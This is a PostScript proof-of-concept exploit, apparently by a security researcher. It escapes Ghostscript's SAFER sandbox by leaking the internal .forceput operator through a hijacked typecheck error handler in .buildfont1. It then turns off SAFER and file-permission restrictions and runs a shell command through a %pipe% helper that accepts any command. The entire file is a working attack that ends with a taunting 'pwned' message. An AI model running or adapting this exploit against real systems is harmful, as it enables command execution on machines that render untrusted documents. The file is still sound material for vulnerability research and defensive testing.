%!PS

%%
%% Safer Mode Bypass by `.forceput` Exposure in `.buildfont1`
%%
%% Author: Hiroki MATSUKUMA
%%

/println  { (\n) exch print print } bind executeonly def
/info     { ([*] ) print println } bind executeonly def
/success  { ([+] ) print println } bind executeonly def
/fail     { ([-] ) print println stop } bind executeonly def

/MaxFileSize 16#10000 def
/readfile {
  (r) file
  dup MaxFileSize string readstring pop
  exch closefile
} bind executeonly def

/osexec {
  (%pipe%) exch concatstrings readfile
} bind executeonly def

(=============================================================================)
(=        Safer Mode Bypass by `.forceput` Exposure in `.buildfont1`         =)
(=============================================================================)
println println println

(Obtaining .forceput operator from .buildfont1 operator...) info
/.forceput null def
/&typecheck errordict /typecheck get def
/typecheckcount 0 def
errordict /typecheck {
  /typecheckcount typecheckcount 1 add def
  typecheckcount 10 eq {
    3 index 13 get
    /.forceput exch store
    pop false
  } if
} put
null null .buildfont1 clear
errordict /typecheck currentdict /&typecheck get put
[
  /&typecheck 
  /typecheckcount
] { currentdict exch undef } forall
(A candidate for .forceput operator found!) success

(Attempting sanity check with the candidate for .forceput operator...) info
<< /overwritten false >> readonly 
begin
  currentdict /overwritten true .forceput
  overwritten not {
    /.forceput where { /.forceput undef } if
  } if
end
currentdict /.forceput known not {
  (.forceput operator could not found...) fail
} if
(Successfully got .forceput operator!) success

(Overwriting several flags to escape from Safer Mode...) info
systemdict /SAFER false .forceput
userparams /LockFilePermissions false .forceput
userparams /PermitFileControl [(*)] .forceput
userparams /PermitFileWriting [(*)] .forceput
userparams /PermitFileReading [(*)] .forceput
save restore

SAFER { 
  (Could not escape from Safer Mode.) fail
} bind executeonly if
(Successfully escaped from Safer Mode!) success

(Executing a shell command...) info
(id) osexec print
(PS: I pwned you <3) success
quit
